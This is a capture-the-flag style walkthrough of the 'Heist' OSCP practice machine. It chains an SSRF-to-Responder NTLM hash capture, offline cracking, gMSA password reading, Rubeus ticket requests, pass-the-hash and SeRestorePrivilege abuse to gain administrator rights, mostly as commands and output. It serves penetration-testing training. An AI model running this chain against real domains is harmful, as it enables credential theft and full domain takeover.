---
title: OSCP Heist - A Playground Practice machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250903
tags:
  - walkthrough
---
# OSCP Heist - A Playground Practice machine

## local.txt

```bash
nmap $ip
```

Output:

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
8080/tcp open  http-proxy
```


```bash
sudo nmap -sC -sV -Pn -p- $ip 
```

Output:

```
map scan report for 192.168.110.165
Host is up (0.036s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-09 16:55:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Not valid before: 2025-09-08T16:51:53
|_Not valid after:  2026-03-10T16:51:53
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-09T16:56:15+00:00
|_ssl-date: 2025-09-09T16:56:54+00:00; +6m10s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6m10s, deviation: 0s, median: 6m09s
| smb2-time: 
|   date: 2025-09-09T16:56:19
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 256.19 seconds

```

Navigate  to http://192.168.110.165:8080/ .

Set a listener in the attacker machine:

```bash
php -S 0.0.0.0:9898
```

Launch the browser:

![[heist_00.png]]

There is a request in the listener:

![[heist_01.png]]

There is a Server Side Request Forgery vulnerability. However there is no execution on the server. By serving a bind or reverse shell the tester can obtain execution on their own attacker machine, never on the server one.

However, it's possible to make the target server to authenticate to the attacker machine exploiting this SSRF:

Set  a responder server in the attacker machine: 

```bash
sudo responder -I tun0 -w -d
```

Trigger the SSRF vulnerability by navigating to http://192.168.207.165:8080/?url=http%3A%2F%2F192.168.45.154:80

```bash
Trigger the SSRF vulnerability by navigating to http://192.168.207.165:8080/?url=http%3A%2F%2F192.168.45.154:8081 
```

where 192.168.207.165 is the target machine and 192.168.45.154 the kali attacker machine. 

Responder output:

```
[HTTP] NTLMv2 Username : HEIST\enox
[HTTP] NTLMv2 Hash     : enox::HEIST:e62ea0c508de08d9:4DDBB74479475CDDC0ED0B18317FD3B6:0101000000000000BFE67266C824DC01707BB49690CC9B1A000000000200080046004B004900450001001E00570049004E002D0047003500590054004E003100460052003500300051000400140046004B00490045002E004C004F00430041004C0003003400570049004E002D0047003500590054004E003100460052003500300051002E0046004B00490045002E004C004F00430041004C000500140046004B00490045002E004C004F00430041004C000800300030000000000000000000000000300000C4F51C6E9DB9499D59C386C317DB4FE1D9EF380289201E62A8474177A8845FCE0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100350034000000000000000000
```

The NetNTLMv2 includes both the challenge (random text) and the encrypted response.

```bash
# Save hash in a file
echo "enox::HEIST:e62ea0c508de08d9:4DDBB74479475CDDC0ED0B18317FD3B6:0101000000000000BFE67266C824DC01707BB49690CC9B1A000000000200080046004B004900450001001E00570049004E002D0047003500590054004E003100460052003500300051000400140046004B00490045002E004C004F00430041004C0003003400570049004E002D0047003500590054004E003100460052003500300051002E0046004B00490045002E004C004F00430041004C000500140046004B00490045002E004C004F00430041004C000800300030000000000000000000000000300000C4F51C6E9DB9499D59C386C317DB4FE1D9EF380289201E62A8474177A8845FCE0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100350034000000000000000000" > hash.txt
```

Crack it offline:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

Output:

```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
california       (enox)     
1g 0:00:00:00 DONE (2025-09-13 12:07) 5.555g/s 8533p/s 8533c/s 8533C/s 123456..mexico1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

Connect via evil-winrm:

```bash
evil-winrm -i $ip -u enox -p california
```


And type the local.txt

```bash
type C:\Users\enox\Desktop\local.txt
```


## proof.txt

```bash
whoami /priv
```


Output:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\enox\Desktop> whoami /groups
```


```bash
whoami /groups
```

Output:

```
ROUP INFORMATION
-----------------

Group Name                                  Type             SID                              
=========================================== ================ =================================
Everyone                                    Well-known group S-1-1-0                          
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                     
BUILTIN\Users                               Alias            S-1-5-32-545                     
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                     
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                          
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                         
NT AUTHORITY\This Organization              Well-known group S-1-5-15                         
HEIST\Web Admins                            Group            S-1-5-21-537427935-490066102-1511
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                      
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

```

Second, download necessary files:

```powershell
upload SharpHound.exe 
```

Run the Sharphound collector:

```bash
.\SharpHound.exe -c All --zipfilename enox
```

Output: the file 20250913095810_enox.zip. 

Download file:

```powershell
download 20250913095810_enox.zip 
```

Run bloodhound in the attacker machine, ingest the file and observe user enox.

![[heist_02.png]]

Use [https://github.com/amandaguglieri/Privescalation/tree/main/tools/GMSAPasswordReader](https://github.com/amandaguglieri/Privescalation/tree/main/tools/GMSAPasswordReader).  Build the binary and export it to the target machine.

```powershell
upload  GMSAPasswordReader.exe"
```

Run the binary:

```powershell
.\GMSAPasswordReader.exe --accountname svc_apache
```

Output:

```
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : C17A10393707DA9B69D04CEDBF59A939
[*]       aes128_cts_hmac_sha1 : B85F5BB6CAD23A10C952A5B703099E58
[*]       aes256_cts_hmac_sha1 : 2F54D1F60F4E8C98E42E78E884B85F24219F3D1EA949244B338B21ABA77090D0
[*]       des_cbc_md5          : 2658F4C7490D8A7A

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : D871B9AF745F0F6B0EB97F368E81B684
[*]       aes128_cts_hmac_sha1 : A71B23C48265B8DC507F778AE8E36F8B
[*]       aes256_cts_hmac_sha1 : DFA100908469AC59C44D9F26DAD282AFF83E54BFB9E3D612155A2CA239415C35
[*]       des_cbc_md5          : B5EA64CB08E3E36B

```

Upload Rubeus.exe:

```powershell
upload Rubeus.exe
```

Generate a kirbi ticket, save it (with /outfile) and inject it (with /ptt):

```powershell
.\Rubeus.exe asktgt /domain:heist.offsec /user:svc_apache /rc4:D871B9AF745F0F6B0EB97F368E81B684 /ptt /outfile:C:\Users\enox\Documents\svc_apache2.kirbi
```

Download the saved ticket to the attacker machine:

```bash
download svc_apache2.kirbi
```

In the attacker machine, use kirbi2john: 

```bash
kirbi2john svc_apache.kirbi 
```

Output:

```
$krb5tgs$23$*svc_apache*$d0c51ac4df571e546dc4f21b51b78599$70ce9cd5306f03fa36c8161db6f68d78f555511d7b3825a3c23076aa618c9a3020752127edd35459f04c9dce4a7ee7642f81fe9b3414604f2f508bad05c2e8e77b31671379708fd21d451d087aaf62cc6fc218f8953fa33ce23efee01b6c2c2289b41dbee9593d907e81ca6c280dc5216dbbb6193676a49d90d0bb88d84595406b43e4cee7c559f0a819e030ba30cc90b04ee814d9d7c59cf776be566ec563e4cdef86eeef642cb8d0b45cee15fb64a900ab8fd9644c865ef439792c1e21fb69cafcaff37073bc87dfa5292640dfb21a1c9ffd8d90d97480cfad7fbf5d48b1dc98486372a0892e184b841863b8d0260a0c98c1bde7c46af0c42f631d87edf521e64f329fb2140794f63718a484d22be61a67546279f305d4dfee2fc426e156b883b58560c15c9aa11b34961de09ef2ea4ae6f1106f94e8012c2ff081ca917ee6f9da6f06bb915551a1bb58150c3636bbb04540761f512685f1a32deb8f1c0c4353431bf11ada5e6a81de8a675a1262bdcf68dce9c9f295eb4907fc78b6a09e7d191b8615b5ba68d90026d5275dc29dc667abd8df76bb586232dd57ac344dbd8124ed4080ba3aa3df664c61964507b2ff095ddba8270fed1ba4a44559a0239590004b54fbe18d40540e7ae37449dcfcbf59f66301fb1929973efbdae858df47715dd35aa6edecdeaa3f6ea752097c6244ca416d23d282188e0de7062a213006c20e503e751dbc3c4293d9159a3cc196315c6d77babf9f92b2b3bc9dd7402dd3723ac4a0b6787e0c449b088ff9f0f2d955375808be78c05f3e59c4316b0a6fe1910bdbe8cf4060d2ca69f8e4fc45cc24f67be1ea3359d19bb97b1cd09d586b3d846508d8702f6c8adc8fcaa02dbea94ebb0045d6d531efdc591a0f767377c4f7fc258ea8773b6b99fca36d73a2dac7c1be10e4d86df2078a859e372aff8b2951bb8a97f683ad3e5b844b54ec06f0ac19f12411d004cb78b2291e1e646ff95b728f2c666ac2ee8b00fbb3e5ae60561b5d5a3094e658f3e2f3e6a8f093833ce8b4802d1baf103300bef327e58eb9a7de76258237378856e27637a309be9a08b27807b3f9f4a0b95453d984589068f64bfdf304eef6730b72fc5e986665ac57725a2fbe1ed5d3f909b8b25c4558d3a539b4c276ddef4e8963455a641c1398580922687070d966d364163798caeba1795acf8cc4a8a2c3e7ccc0a93f937c4fcd7d0996d80fa8cddfec84627f874c37b02bd1107b4adf1892f6fadff41649a1462c2feb114ca62574f90f32aa5b2f6aa73e1b630c30dfb18cb9b186a4e51c
```

Running hashcat does not return anything:

```bash
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
```

However, with the GMSA captured password the tester can access the target machine by using evil-winrm:

```bash
evil-winrm -i 192.168.207.165 -u svc_apache$ -H D871B9AF745F0F6B0EB97F368E81B684
```

Run basic enumeration:

```powershell
whoami /priv 
whoami /groups
```

Output:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

SeRestorePrivilege is a dangerous permission. [Forked the repo](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeRestoreAbuse) that exploit this privilege:

```bash
.\SeRestoreAbuse-x64.exe "cmd /c net localgroup administrators enox /add"
```

Check it out:

```bash
net user enox
```

Output:

```
User name                    enox
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/31/2021 6:09:05 AM
Password expires             Never
Password changeable          9/1/2021 6:09:05 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/1/2024 7:28:11 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Web Admins           *Domain Users
The command completed successfully.

```

Access as enox:

```bash
evil-winrm -i $ip -u enox -p california
```

Am i in Administrators group:

```bash
whoami /groups
```

Output:

```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
HEIST\Web Admins                           Group            S-1-5-21-537427935-490066102-1511301751-1104 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

Print the proof.txt
 
```bash
type c:\Users\Administrator\Desktop\proof.txt
```
